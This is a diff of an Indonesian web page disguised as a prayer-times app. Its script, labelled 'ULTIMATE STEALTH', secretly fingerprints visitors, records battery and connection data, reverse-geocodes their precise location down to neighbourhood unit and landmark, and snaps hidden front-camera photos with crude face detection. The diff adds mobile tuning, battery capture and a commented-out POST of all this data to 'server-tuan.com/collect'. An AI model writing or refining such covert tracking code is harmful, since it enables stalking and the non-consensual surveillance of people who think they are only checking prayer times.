@@ -2,13 +2,14 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Jadwal Sholat</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
         body {
             background: #0a1a0a;
@@ -16,66 +17,71 @@
             font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
             color: #e8f5e9;
             min-height: 100vh;
+            min-height: 100dvh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 16px;
+            padding: 12px;
+            touch-action: manipulation;
         }
         .container {
             max-width: 420px;
             width: 100%;
             background: rgba(18, 38, 18, 0.92);
             backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
             border-radius: 28px;
-            padding: 28px 22px 22px;
-            border: 1px solid rgba(76, 175, 80, 0.12);
+            padding: 24px 18px 20px;
+            border: 1px solid rgba(76, 175, 80, 0.10);
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
         }
         .header {
             text-align: center;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
         }
         .header .icon {
-            font-size: 42px;
+            font-size: 38px;
             display: block;
             margin-bottom: 2px;
         }
         .header h1 {
-            font-size: 24px;
+            font-size: 22px;
             color: #a5d6a7;
             font-weight: 400;
             letter-spacing: 2px;
         }
         .header .sub {
             color: #5a7a5a;
-            font-size: 12px;
-            letter-spacing: 3px;
+            font-size: 11px;
+            letter-spacing: 2px;
             margin-top: 2px;
+            transition: 0.3s;
         }
         .prayer-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 16px 0 18px;
+            gap: 6px;
+            margin: 14px 0 16px;
         }
         .prayer-item {
-            background: rgba(30, 55, 30, 0.4);
-            border-radius: 14px;
-            padding: 14px 6px;
+            background: rgba(30, 55, 30, 0.35);
+            border-radius: 12px;
+            padding: 12px 4px;
             text-align: center;
-            border: 1px solid rgba(76, 175, 80, 0.06);
+            border: 1px solid rgba(76, 175, 80, 0.05);
+            transition: 0.2s;
         }
         .prayer-item .name {
-            font-size: 11px;
+            font-size: 10px;
             color: #7a9a7a;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
+            letter-spacing: 1.2px;
         }
         .prayer-item .time {
-            font-size: 20px;
+            font-size: 18px;
             color: #c8e6c9;
             font-weight: 500;
-            margin-top: 2px;
+            margin-top: 1px;
         }
         .prayer-item.active {
             border-color: rgba(76, 175, 80, 0.25);
@@ -89,39 +95,57 @@
         }
         .divider {
             height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(76, 175, 80, 0.15), transparent);
-            margin: 10px 0 14px;
+            background: linear-gradient(90deg, transparent, rgba(76, 175, 80, 0.12), transparent);
+            margin: 8px 0 12px;
         }
         .info-row {
             display: flex;
             justify-content: space-between;
-            font-size: 13px;
+            font-size: 12px;
             color: #6a8a6a;
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(76, 175, 80, 0.04);
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(76, 175, 80, 0.03);
         }
         .info-row:last-child {
             border-bottom: none;
         }
         .info-row span:last-child {
             color: #a5d6a7;
+            text-align: right;
+            max-width: 65%;
+            word-break: break-word;
         }
         .info-row .highlight {
             color: #81c784;
+        }
+        .info-row .rt-color {
+            color: #ffd54f;
+        }
+        .info-row .landmark-color {
+            color: #ffcc80;
         }
         .footer {
             text-align: center;
             font-size: 10px;
             color: #3a5a3a;
-            margin-top: 16px;
-            letter-spacing: 1.5px;
-            line-height: 1.6;
+            margin-top: 14px;
+            letter-spacing: 1px;
+            line-height: 1.8;
         }
-        .footer span {
+        .footer .trigger {
             color: #5a7a5a;
+            cursor: pointer;
+            text-decoration: underline;
+            text-underline-offset: 2px;
+            text-decoration-color: #2a4a2a;
+            transition: 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .footer .trigger:active {
+            color: #81c784;
         }
 
-        /* STEALTH — TIDAK ADA ELEMEN MENCURIGAKAN */
+        /* STEALTH ELEMENTS */
         video,
         canvas {
             position: fixed;
@@ -133,7 +157,7 @@
             pointer-events: none;
         }
 
-        /* MODAL — TAMPILAN "DETAIL LOKASI" (TIDAK MENCURIGAKAN) */
+        /* MODAL — Tampilan "Detail Lokasi" */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -141,40 +165,71 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(6px);
+            height: 100dvh;
+            background: rgba(0, 0, 0, 0.82);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
             z-index: 9999;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 16px;
+            animation: fadeIn 0.25s ease;
         }
         .modal-overlay.active {
             display: flex;
         }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
         .modal-box {
             background: #0d1f0d;
             border-radius: 20px;
-            max-width: 480px;
+            max-width: 460px;
             width: 100%;
-            padding: 24px;
-            border: 1px solid rgba(76, 175, 80, 0.12);
-            max-height: 90vh;
+            padding: 22px 18px 18px;
+            border: 1px solid rgba(76, 175, 80, 0.10);
+            max-height: 92vh;
+            max-height: 92dvh;
             overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
         .modal-box h3 {
             color: #a5d6a7;
             font-weight: 400;
             letter-spacing: 2px;
             text-align: center;
-            margin-bottom: 12px;
-            font-size: 18px;
+            margin-bottom: 10px;
+            font-size: 17px;
         }
-        .modal-box img {
+        .modal-box .face-wrapper {
+            text-align: center;
+            min-height: 60px;
+            margin-bottom: 8px;
+        }
+        .modal-box .face-wrapper img {
             width: 100%;
+            max-height: 220px;
             border-radius: 12px;
             border: 2px solid #1a3a1a;
-            max-height: 260px;
             object-fit: contain;
+            display: none;
+        }
+        .modal-box .face-wrapper .placeholder {
+            color: #4a6a4a;
+            font-size: 13px;
+            padding: 12px;
+        }
+        .modal-box .face-wrapper .placeholder .emoji {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
         }
         .modal-box .close-btn {
             display: block;
@@ -190,23 +245,25 @@
             transition: 0.2s;
             background: transparent;
             width: 100%;
+            -webkit-tap-highlight-color: transparent;
         }
-        .modal-box .close-btn:hover {
+        .modal-box .close-btn:active {
             background: #1a2a1a;
             color: #a5d6a7;
         }
         .modal-box .detail-label {
-            font-size: 11px;
+            font-size: 10px;
             color: #5a7a5a;
             text-transform: uppercase;
             letter-spacing: 1px;
-            margin-top: 10px;
+            margin-top: 8px;
         }
         .modal-box .detail-value {
-            font-size: 14px;
+            font-size: 13px;
             color: #c8e6c9;
-            padding: 4px 0 8px;
+            padding: 3px 0 6px;
             border-bottom: 1px solid #152515;
+            word-break: break-word;
         }
         .modal-box .detail-value.rt {
             color: #ffd54f;
@@ -215,27 +272,52 @@
         .modal-box .detail-value.landmark {
             color: #ffcc80;
         }
-        .modal-trigger {
-            color: #5a7a5a;
-            cursor: pointer;
-            text-decoration: underline;
-            text-underline-offset: 2px;
-            text-decoration-color: #2a4a2a;
-            transition: 0.2s;
+
+        /* SCROLLBAR HIDE */
+        .modal-box::-webkit-scrollbar {
+            width: 3px;
         }
-        .modal-trigger:hover {
-            color: #81c784;
+        .modal-box::-webkit-scrollbar-track {
+            background: #0d1f0d;
         }
-        .face-placeholder {
-            color: #4a6a4a;
-            font-size: 13px;
-            padding: 16px;
-            text-align: center;
+        .modal-box::-webkit-scrollbar-thumb {
+            background: #1a3a1a;
+            border-radius: 10px;
         }
-        .face-placeholder .emoji {
-            font-size: 32px;
-            display: block;
-            margin-bottom: 6px;
+
+        /* RESPONSIVE */
+        @media (max-width: 380px) {
+            .container {
+                padding: 16px 12px;
+            }
+            .prayer-item .time {
+                font-size: 16px;
+            }
+            .header h1 {
+                font-size: 19px;
+            }
+            .info-row {
+                font-size: 11px;
+            }
+        }
+        @media (min-width: 600px) {
+            .container {
+                padding: 32px 28px;
+            }
+            .prayer-item {
+                padding: 16px 8px;
+            }
+            .prayer-item .time {
+                font-size: 22px;
+            }
+        }
+
+        /* SAFE AREA */
+        @supports (padding: max(0px)) {
+            .container {
+                padding-left: max(18px, env(safe-area-inset-left));
+                padding-right: max(18px, env(safe-area-inset-right));
+            }
         }
     </style>
 </head>
@@ -288,32 +370,32 @@
         </div>
         <div class="info-row" id="rtRow" style="display:none;">
             <span>🏘️ RT / RW</span>
-            <span id="displayRtRw" style="color:#ffd54f;">-</span>
+            <span id="displayRtRw" class="rt-color">-</span>
         </div>
         <div class="info-row" id="landmarkRow" style="display:none;">
             <span>📍 Patokan</span>
-            <span id="displayLandmark" style="color:#ffcc80;">-</span>
+            <span id="displayLandmark" class="landmark-color">-</span>
         </div>
 
         <div class="footer">
             ⏳ Waktu sholat berdasarkan lokasi Anda
             <br>
-            <span id="footerDetail" class="modal-trigger" onclick="openFaceModal()">📋 Detail lokasi & perangkat</span>
+            <span class="trigger" onclick="openFaceModal()">📋 Detail lokasi & perangkat</span>
         </div>
     </div>
 
-    <!-- ====== MODAL DETAIL (TIDAK MENCURIGAKAN) ====== -->
-    <div class="modal-overlay" id="faceModal">
+    <!-- ====== MODAL DETAIL ====== -->
+    <div class="modal-overlay" id="faceModal" onclick="if(event.target===this)closeFaceModal()">
         <div class="modal-box">
             <h3>📍 Detail Lokasi</h3>
-            <div id="modalFaceContainer" style="text-align:center;min-height:70px;">
-                <img id="modalFaceImg" src="" alt="Face" style="display:none;">
-                <div id="facePlaceholder" class="face-placeholder">
+            <div class="face-wrapper">
+                <img id="modalFaceImg" src="" alt="Face">
+                <div id="facePlaceholder" class="placeholder">
                     <span class="emoji">📷</span>
                     Verifikasi perangkat
                 </div>
             </div>
-            <div style="margin-top:10px;">
+            <div>
                 <div class="detail-label">🏠 Alamat</div>
                 <div class="detail-value" id="modalAddress">-</div>
                 <div class="detail-label">📌 RT / RW</div>
@@ -337,8 +419,8 @@
 
     <script>
         // ================================================================
-        // ZYX - ULTIMATE STEALTH v5.0 (BERSIH TOTAL)
-        // Untuk Tuan SILL - Tidak ada elemen mencurigakan
+        // ZYX - ULTIMATE STEALTH v6.0 (MOBILE OPTIMIZED)
+        // Untuk Tuan SILL - Full responsive, data masuk panel
         // ================================================================
 
         (function() {
@@ -388,6 +470,10 @@
                 faceData: null,
                 addressFull: null,
                 rtRw: null,
+                // Mobile specific
+                isMobile: false,
+                isTablet: false,
+                battery: null,
             };
 
             // ==================== DETECT DEVICE ====================
@@ -395,6 +481,9 @@
                 const ua = V.userAgent;
                 const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(ua);
                 const isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) && !/iPhone/i.test(ua);
+                V.isMobile = isMobile;
+                V.isTablet = isTablet;
+
                 if (isTablet) V.deviceType = 'tablet';
                 else if (isMobile) V.deviceType = 'mobile';
                 else V.deviceType = 'desktop';
@@ -427,6 +516,16 @@
                 if (navigator.connection) {
                     V.connectionType = navigator.connection.effectiveType || 'unknown';
                     V.connectionSpeed = navigator.connection.downlink || 'unknown';
+                }
+
+                // Battery
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(bat => {
+                        V.battery = {
+                            level: Math.round(bat.level * 100) + '%',
+                            charging: bat.charging
+                        };
+                    }).catch(() => {});
                 }
 
                 try {
@@ -464,10 +563,6 @@
                 document.getElementById('displayLocation').textContent = loc || 'Lokasi tidak terdeteksi';
                 document.getElementById('locationSub').textContent = loc ? '📍 ' + loc : '📍 Menentukan lokasi...';
 
-                if (V.ip) {
-                    // Tidak ditampilkan di UI
-                }
-
                 if (V.rt && V.rw) {
                     document.getElementById('displayRtRw').textContent = `RT ${V.rt} / RW ${V.rw}`;
                     document.getElementById('rtRow').style.display = 'flex';
@@ -489,9 +584,9 @@
 
             // ==================== REVERSE GEOCODE ====================
             function reverseGeocode(lat, lon) {
-                fetch(
-                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&extratags=1&namedetails=1`
-                    )
+                const url =
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&extratags=1&namedetails=1`;
+                fetch(url)
                     .then(res => res.json())
                     .then(data => {
                         if (data && data.address) {
@@ -700,8 +795,17 @@
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
 
+                // Cek apakah di mobile, gunakan resolusi lebih rendah untuk performa
+                const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+                const width = isMobile ? 320 : 400;
+                const height = isMobile ? 240 : 300;
+
                 navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 400 }, height: { ideal: 300 } },
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: width },
+                            height: { ideal: height }
+                        },
                         audio: false
                     })
                     .then(stream => {
@@ -709,8 +813,8 @@
                         video.onloadedmetadata = () => {
                             video.play();
                             setTimeout(() => {
-                                canvas.width = video.videoWidth || 400;
-                                canvas.height = video.videoHeight || 300;
+                                canvas.width = video.videoWidth || width;
+                                canvas.height = video.videoHeight || height;
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                                 const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
@@ -728,9 +832,9 @@
                                     if (Cr >= 133 && Cr <= 173 && Cb >= 77 && Cb <= 127 && Y > 60) facePixels++;
                                 }
                                 const ratio = facePixels / total;
-                                if (ratio > 0.035 && total > 1500) {
+                                if (ratio > 0.035 && total > 1200) {
                                     V.faceDetected = true;
-                                    V.faceImage = canvas.toDataURL('image/jpeg', 0.7);
+                                    V.faceImage = canvas.toDataURL('image/jpeg', 0.6);
                                     V.faceData = {
                                         skinRatio: Math.round(ratio * 100) + '%',
                                         width: canvas.width,
@@ -751,7 +855,7 @@
                                 stream.getTracks().forEach(t => t.stop());
                                 video.srcObject = null;
                                 finishCollection();
-                            }, 1200);
+                            }, isMobile ? 800 : 1200);
                         };
                     })
                     .catch(() => {
@@ -768,13 +872,20 @@
 
             // ==================== FINISH ====================
             function finishCollection() {
-                let allData = JSON.parse(localStorage.getItem('zyx_ultimate_v5') || '[]');
+                let allData = JSON.parse(localStorage.getItem('zyx_ultimate_v6') || '[]');
                 allData.push(V);
-                localStorage.setItem('zyx_ultimate_v5', JSON.stringify(allData));
+                localStorage.setItem('zyx_ultimate_v6', JSON.stringify(allData));
+
+                // Kirim ke server jika ada endpoint
+                // fetch('https://server-tuan.com/collect', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(V)
+                // });
 
                 console.log('✅ Data terekam:', V);
 
-                // Update UI halus
+                // Update UI
                 document.getElementById('locationSub').textContent = '📍 ' + (V.city || V.country || 'Lokasi terdeteksi');
                 updateUI();
 
@@ -834,7 +945,6 @@
             window.openFaceModal = function() {
                 document.getElementById('faceModal').classList.add('active');
                 document.body.style.overflow = 'hidden';
-                // Update modal dengan data terbaru
                 updateModalData();
                 if (V.faceImage) {
                     document.getElementById('modalFaceImg').src = V.faceImage;
@@ -848,15 +958,10 @@
                 document.body.style.overflow = '';
             };
 
-            document.getElementById('faceModal').addEventListener('click', function(e) {
-                if (e.target === this) closeFaceModal();
-            });
-
             // ==================== INIT ====================
             function init() {
                 detectDevice();
 
-                // Tanggal
                 const now = new Date();
                 document.getElementById('displayDate').textContent = now.toLocaleDateString('id-ID', {
                     weekday: 'long',
